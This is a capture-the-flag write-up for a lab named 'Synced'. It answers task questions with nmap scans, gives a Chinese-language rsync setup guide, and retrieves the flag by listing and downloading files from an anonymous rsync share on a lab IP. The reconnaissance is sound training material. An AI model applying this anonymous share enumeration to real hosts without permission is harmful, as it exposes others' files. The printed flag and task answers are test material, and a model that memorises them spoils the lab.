<center>Synced</center>







[toc]









## Synced

> Synced.









### 1. task

1. What is the default port for rsync?

```shell
nmap  -sV -T5 10.129.15.206 -v

873
```

2. How many TCP ports are open on the remote host?

```shell
1
```

3. What is the protocol version used by rsync on the remote machine?

```shell
nmap -sV -p873 10.129.15.206 -v

31
```

4. What is the most common command name on Linux to interact with rsync?

```shell
rsync
```

5. What credentials do you have to pass to rsync in order to use anonymous authentication? anonymous:anonymous, anonymous, None, rsync:rsync

```shell
None
```

6. What is the option to only list shares and files on rsync? (No need to include the leading -- characters)

```shell
rsync --help

--list-only  
```







### 2. rsync

> rsync: Rsync (Remote Sync) 是一个快速、多功能的文件同步和传输工具。
>
> [blog](https://www.ljh.cool/5718.html)

```shell
支持增量传输
保留文件权限和时间戳
支持压缩传输
支持SSH通道加密传输
```

> `默认端口：873`

> 服务端和客户端配置

````shell
1. 服务端
# Debian/Ubuntu
sudo apt update
sudo apt install rsync

# CentOS/RHEL
sudo dnf install rsync


#### 配置文件
```conf:/etc/rsyncd.conf
# 全局配置
uid = nobody
gid = nobody
use chroot = yes
max connections = 4
pid file = /var/run/rsyncd.pid
log file = /var/log/rsyncd.log
transfer logging = yes

# 模块定义
[share]
path = /data/share
comment = Public Share
read only = no
list = yes
auth users = rsyncuser
secrets file = /etc/rsyncd.secrets
```


#### 创建密码文件
```bash
# 创建密码文件
echo "rsyncuser:password" > /etc/rsyncd.secrets

# 设置权限
chmod 600 /etc/rsyncd.secrets
```


#### 启动服务
```bash
# 系统服务方式
sudo systemctl enable rsync
sudo systemctl start rsync

# 或直接启动
sudo rsync --daemon
```


#### 安装客户端
```bash
# Debian/Ubuntu
sudo apt install rsync

# CentOS/RHEL
sudo dnf install rsync
```


#### 创建密码文件
```bash
# 创建客户端密码文件
echo "password" > ~/.rsync.pass

# 设置权限
chmod 600 ~/.rsync.pass
```


#### 本地同步
```bash
# 基本同步
rsync -av source/ destination/

# 带进度条
rsync -av --progress source/ destination/

# 删除目标目录中源目录没有的文件
rsync -av --delete source/ destination/
```


#### 远程同步
```bash
# 通过SSH同步（推荐）
rsync -avz -e ssh /local/path/ user@remote:/remote/path/

# 通过rsync守护进程同步
rsync -avz /local/path/ rsyncuser@remote::share/

# 使用密码文件
rsync -avz --password-file=~/.rsync.pass /local/path/ rsyncuser@remote::share/
```


````







### 3. flag

> flag

```shell
# 1. rsync工具列出rsync上的共享和文件。
rsync --list-only 10.129.15.206::

# 2. 查看public目录
rsync 10.129.15.206::public

# 获取flag
rsync 10.129.15.206::public/flag.txt flag.txt
cat flag.txt
72eaf5344ebb84908ae543a719830519
```

